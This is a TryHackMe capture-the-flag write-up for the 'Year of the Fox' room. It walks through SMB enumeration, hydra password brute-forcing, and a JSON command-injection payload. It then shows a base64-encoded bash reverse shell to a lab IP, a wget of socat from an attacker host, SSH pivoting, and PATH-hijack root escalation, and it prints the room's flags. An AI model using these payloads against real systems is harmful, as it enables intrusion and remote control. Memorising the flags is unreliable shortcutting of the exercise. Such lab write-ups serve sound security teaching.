# 🦊 Year of the Fox — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Category](https://img.shields.io/badge/Category-Web%20|%20SMB%20|%20PrivEsc-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Author:** Miraç Akkuş (LatenT)  
> **Date:** May 2026  
> **Room:** [Year of the Fox](https://tryhackme.com/room/yotf)

---

## 🚩 Flags Captured

| Flag | Location | Value |
|------|----------|-------|
| **Web Flag** | `/var/www/web-flag.txt` | `THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}` |
| **User Flag** | `/home/fox/user-flag.txt` | `THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}` |
| **Root Flag** | `/home/rascal/.did-you-think-I-was-useless.root` | `THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}` |

---

## 📋 Executive Summary

This writeup documents the complete compromise of the **Year of the Fox** machine, demonstrating a multi-stage attack chain from external reconnaissance through SMB enumeration, web exploitation via command injection, SSH pivoting, and culminating in privilege escalation through PATH hijacking. The engagement highlights critical security failures including weak authentication mechanisms, insecure input handling, and misconfigured sudo privileges.

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance and service enumeration |
| `enum4linux` | SMB user and share enumeration |
| `hydra` | Online password brute-forcing |
| `burpsuite` | HTTP interception and request manipulation |
| `socat` | Bidirectional port forwarding |
| `nc` | Reverse shell handler |

---

## 🔍 Phase 1: Reconnaissance & Enumeration

### Network Scanning

```bash
nmap -sV -sC -T4 <TARGET_IP>

Findings
Table
Port	State	Service	Version	Notes
80/tcp	open	HTTP	Apache httpd 2.4.29	HTTP Basic Authentication enabled
139/tcp	open	NetBIOS	Samba smbd 3.X-4.X	Guest access available
445/tcp	open	NetBIOS	Samba smbd 4.7.6-Ubuntu	Share enumeration possible
Key Observations:

    Web server returns 401 Unauthorized with realm: "You want in? Gotta guess the password!"
    SMB services suggest potential user enumeration via null sessions

SMB Enumeration
bash
Copy

enum4linux <TARGET_IP>

Discovered Users:

    fox — Local system user
    rascal — Local system user

Discovered Shares:

    yotf — Restricted share (Fox's Stuff)
    IPC$ — Standard inter-process communication

🌐 Phase 2: Initial Foothold (Web Exploitation)
HTTP Basic Auth Brute-Force
Leveraging enumerated usernames against the web application's authentication:
bash
Copy

hydra -l rascal -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get /

Result: rascal:987321
Command Injection via Search Function
Post-authentication analysis revealed a search functionality vulnerable to command injection through JSON parameter manipulation.
Vulnerable Request:
http
Copy

POST /assets/php/search.php HTTP/1.1
Host: <TARGET_IP>
Content-Type: text/plain;charset=UTF-8
Authorization: Basic cmFzY2FsOjk4NzMyMQ==

{"target":"\";whoami\n"}

Technical Analysis:
The backend likely implements the search as:
php
Copy

system("grep " . $user_input . " files/");

By injecting \";command\n, we:

    Escape the JSON string context with \"
    Terminate the grep command with ;
    Execute arbitrary commands before the newline

Web Flag Extraction
bash
Copy

{"target":"\";cat ../../../web-flag.txt;\n"}

Web Flag: THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
🐚 Phase 3: Shell Access
Reverse Shell Deployment
Listener Configuration:
bash
Copy

nc -nlvp 9001

Payload Delivery (Base64-encoded bash reverse shell):
bash
Copy

{"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjEwNi4yMjIvOTAwMSAwPiYx | base64 -d | bash; \n"}

Result: Interactive shell obtained as www-data
🔄 Phase 4: Pivoting & Lateral Movement
Local Service Discovery
bash
Copy

netstat -tulpn
ss -tulpn

Critical Finding: SSH service bound exclusively to 127.0.0.1:22 — no external access.
Port Forwarding with Socat
Attacker Machine (File Server):
bash
Copy

python3 -m http.server 8000

Target Machine (Socat Deployment):
bash
Copy

wget http://<ATTACKER_IP>:8000/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat TCP-LISTEN:2222,fork TCP:127.0.0.1:22

Result: SSH service now accessible on target's external interface at port 2222.
SSH Brute-Force (Fox User)
bash
Copy

hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>:2222

Result: fox:<password>
SSH Access:
bash
Copy

ssh fox@<TARGET_IP> -p 2222

🚀 Phase 5: Privilege Escalation
User Flag
bash
Copy

cat /home/fox/user-flag.txt

User Flag: THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
Sudo Privilege Analysis
bash
Copy

sudo -l

Vulnerability: User fox authorized to execute /usr/sbin/shutdown as root without password authentication.
PATH Hijacking Exploitation
Binary Analysis:
Static analysis of shutdown revealed:

    Calls poweroff using relative path (not /sbin/poweroff)
    No secure_path directive in /etc/sudoers

Exploitation Chain:
bash
Copy

# Create malicious poweroff binary (spawns bash)
cp /bin/bash /tmp/poweroff

# Prepend malicious directory to PATH
export PATH=/tmp:$PATH

# Execute shutdown with root privileges
sudo /usr/sbin/shutdown

Result: Root shell obtained (uid=0(root)).
🏁 Phase 6: Root Flag
Decoy Detection
bash
Copy

cat /root/root.txt

Analysis: File contains placeholder text — intentional misdirection by the room author.
Real Root Flag Location
bash
Copy

cat /home/rascal/.did-you-think-I-was-useless.root

Root Flag: THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}
Additional Content:
plain
Copy

Here's the prize: YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMwMwo=
Good luck!

Bonus Analysis:
bash
Copy

echo "YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMwMwo=" | base64 -d
# Output: a0274786e2a627078666d6467797046666766683b693232353a6968303

🗺️ Attack Path Visualization
plain
Copy

[Attacker]
    │
    ├───nmap/enum4linux───► [Target: 80,139,445]
    │                           │
    │                           ▼
    │                   [SMB User Enum: fox, rascal]
    │                           │
    │                           ▼
    │                   [Hydra: rascal:987321]
    │                           │
    │                           ▼
    │                   [Web Access + Command Injection]
    │                           │
    │                           ▼
    │                   [www-data Shell]
    │                           │
    │                           ▼
    │                   [Socat Port Forward :2222]
    │                           │
    │                           ▼
    │                   [SSH Access: fox]
    │                           │
    │                           ▼
    │                   [User Flag + sudo -l]
    │                           │
    │                           ▼
    │                   [PATH Hijacking Exploit]
    │                           │
    │                           ▼
    └──────────────────► [Root Shell + Flags]

🛡️ Vulnerability Assessment & Remediation
Table
#	Vulnerability	Severity	CVSS	Remediation
1	Weak HTTP Basic Auth	🔴 Critical	9.8	Implement MFA; enforce strong password policies; consider OAuth/OpenID Connect
2	OS Command Injection	🔴 Critical	9.8	Use parameterized queries; input validation; avoid system()/exec() with user input
3	SMB Null Session	🟠 High	7.5	Disable guest access; restrict anonymous enumeration; implement SMB signing
4	Local Service Exposure	🟠 High	7.0	Bind services to specific interfaces; implement firewall rules; use VPN for management
5	Sudo Misconfiguration	🔴 Critical	9.0	Remove NOPASSWD entries; use absolute paths in sudoers; implement command whitelisting
6	Plaintext Credentials in Shares	🟠 High	7.5	Encrypt sensitive data; use secrets management; regular access audits
🎓 Key Takeaways

    Enumeration is Exploitation: SMB user enumeration directly enabled web brute-force success
    Input Sanitization: JSON contexts are equally vulnerable to injection — never trust client input
    Pivoting is Essential: Local services require tunneling; socat and chisel are indispensable
    Sudo Analysis: sudo -l often reveals the path to root through misconfigured binaries
    PATH Hijacking Classic: Relative path calls + sudo = immediate privilege escalation
    Decoy Awareness: Always verify flag locations — authors love misdirection

    ⚠️ Legal Disclaimer: This writeup is for educational and research purposes only. Always obtain explicit written authorization before testing systems you do not own. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and similar international legislation.

Author: Miraç Akkuş (LatenT)
Date: May 2026
Writeup #4
